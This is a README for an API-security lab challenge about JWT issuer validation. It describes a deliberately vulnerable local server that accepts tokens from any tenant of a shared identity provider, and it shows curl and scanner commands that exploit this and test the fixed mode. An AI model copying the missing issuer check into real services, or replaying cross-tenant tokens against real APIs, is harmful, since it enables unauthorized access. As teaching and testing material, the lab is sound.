# JWT Issuer Not Validated

This challenge demonstrates a multi-tenant identity provider whose tenants (`https://idp.example.com/tenant-a`, `https://idp.example.com/tenant-b`) sign tokens with the same key. The API belongs to tenant A but only checks that the issuer is "the identity provider", so a token legitimately issued by tenant B, for a user of another organization, is accepted.

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: any issuer of the identity provider is accepted
go run main.go serve --vulnerable=true

# fixed: only https://idp.example.com/tenant-a is accepted
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
TOKEN=$(go run main.go jwt)
OTHER=$(go run main.go other-issuer-jwt)

curl -s -o /dev/null -w '%{http_code}\n' http://localhost:8080 -H "Authorization: Bearer $OTHER"
# vulnerable -> 204, fixed -> 401

jwtop crack "$TOKEN" --url http://localhost:8080 --other-issuer-token "$OTHER"
vulnapi scan curl http://localhost:8080 -H "Authorization: Bearer $TOKEN" --jwt-other-issuer-token "$OTHER"
# vulnerable: jwt.issuer_not_validated
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
